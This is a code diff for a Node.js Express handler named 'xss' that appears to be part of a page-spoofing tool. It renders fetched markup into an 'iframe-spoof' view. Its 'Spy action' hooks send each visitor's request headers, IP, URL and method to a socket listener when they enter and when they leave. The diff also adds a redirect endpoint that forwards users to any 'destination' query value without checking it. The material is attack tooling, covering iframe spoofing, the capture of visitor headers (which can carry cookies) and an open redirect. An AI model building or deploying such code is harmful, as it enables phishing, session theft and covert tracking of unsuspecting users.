@@ -35,12 +35,18 @@ exports.xss = function(req, res){
 
     // Parses head markup
     var head = body.split("<head>", 2);
-    head = head[1].split("</head>", 2);
+
+    if(head[1]){
+      head = head[1].split("</head>", 2);
+    }
 
     // Parses body markup
     var bodyData = body.split("<body", 2);
-    bodyData = bodyData[1].split("</body>", 2);
-    bodyData[0] = "<body " + bodyData[0];
+
+    if(bodyData[1]){
+      bodyData = bodyData[1].split("</body>", 2);
+      bodyData[0] = "<body " + bodyData[0];
+    }
 
     res.render('iframe-spoof', {
       title: 'Iframe',
@@ -52,9 +58,27 @@ exports.xss = function(req, res){
 
   // Spy action
 
-  exports.socket && exports.socket.emit('data', {
-    headers: req.headers
+  exports.socket && exports.socket.emit('entering', {
+    header: req.headers,
+    type: req.method,
+    url: req.url,
+    ip: req.ip,
+    httpVersion: req.httpVersion
   });
+};
+
+exports.redirect = function(req, res){
+  // Spy Action
+
+  exports.socket && exports.socket.emit('leaving', {
+    header: req.headers,
+    type: req.method,
+    url: req.url,
+    ip: req.ip,
+    httpVersion: req.httpVersion
+  });
+
+  res.redirect(req.query["destination"]);
 };
 
 exports.spy = function(req, res){
